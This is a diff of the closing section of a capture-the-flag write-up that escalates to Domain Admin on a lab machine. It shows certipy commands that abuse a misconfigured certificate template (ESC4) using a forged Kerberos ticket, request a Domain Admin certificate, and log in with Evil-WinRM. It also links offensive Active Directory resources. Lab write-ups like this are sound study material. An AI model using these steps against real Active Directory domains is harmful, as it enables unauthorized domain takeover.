@@ -189,46 +189,52 @@ This certificate template **DunderMifflinAuthentication** has several dangerous 
 
 now we need to list all the available certificate templates using the forged Kerberos ticket
 
-so we will use **ca_svc.ccache**
-this file contain the Kerberos credential  that was created during the shadow attack
+---
 
-so let's use `certipy-ad template` command to lists information about certificate templates available on the Domain Controller (CA server)
+
+### Exploiting the Misconfigured Template
+
+Using the forged Kerberos ticket (`ca_svc.ccache`), we listed all available certificate templates:
 
 ```bash
 KRB5CCNAME=$KRB5_FILE certipy template -k -template "$TEMPLATE" -dc-ip "$HOST" -target "$DC"
 ```
-![](../pics/xxx.png)
 
+![cert templates](../pics/xxx.png)
 
-we now control the **DunderMifflinAuthentication** template and we can issue certificates for any user we want  including the Domain Admin 
+We then issued a certificate for the **Domain Admin** using the following command:
 
-we can do that by using the following command 
 ```bash
 sudo certipy-ad req -u ca_svc -hashes '3xxxxxxxxxxxxxxxxxxxxxxxxx' -ca sequel-DC01-CA -target sequel.htb -dc-ip xx.xx.xx.xx -template DunderMifflinAuthentication -upn target@sequel.htb -dns target.sequel.htb -ns xx.xx.xx.xx -debug
 ```
 
-![](../pics/admin.png)
+![admin cert](../pics/admin.png)
 
-now lets use `administrator_administrator.pfx` to get the TGT 
+Finally, we used the `administrator_administrator.pfx` file to retrieve the TGT:
 
-![](../pics/fin.png)
+![final tgt](../pics/fin.png)
 
-finally we got the Administrator hash through the certificate
+---
 
-let's use it now to get the root flag 
-we will login using `Evil-Winrm`
+## 🎉 Root Flag
 
-![](../pics/done.png)
+Using the certificate, we logged in with `Evil-WinRM` and retrieved the **root flag**:
 
-finally we got the root flag too
-thank you for reading and if you had any questions you can reach me out on twitter @kareemwalid17
+![root flag](../pics/done.png)
 
-![alt text](https://media.tenor.com/H9y5_3rPqkAAAAAM/peace-out-im-out.gif)
+## 🙏 Conclusion
 
-## Resources Time
-[Hacking with Bloodhound: Map Your Environment](https://www.youtube.com/watch?v=0gK8t7Kk7ZI)
-[Vulnerable Certificate Template Access Control - ESC4](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4)
-[SMB hacking](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
-[Shadow credentials abusing](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
-[Attacking kerberos Authentication](https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=9501961)
-[AD hacking Steps](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+Thank you for reading! If you have any questions, feel free to reach out to me on Twitter: [@kareemwalid17](https://twitter.com/kareemwalid17).
+
+![peace out](https://media.tenor.com/H9y5_3rPqkAAAAAM/peace-out-im-out.gif)
+
+---
+## 📚 Resources
+
+- [Hacking with BloodHound: Map Your Environment](https://www.youtube.com/watch?v=0gK8t7Kk7ZI)
+- [Vulnerable Certificate Template Access Control - ESC4](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-template-access-control---esc4)
+- [SMB Hacking](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
+- [Shadow Credentials Abusing](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+- [Attacking Kerberos Authentication](https://ieeexplore.ieee.org/stamp/stamp.jsp?arnumber=9501961)
+- [Active Directory Hacking Steps](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
+
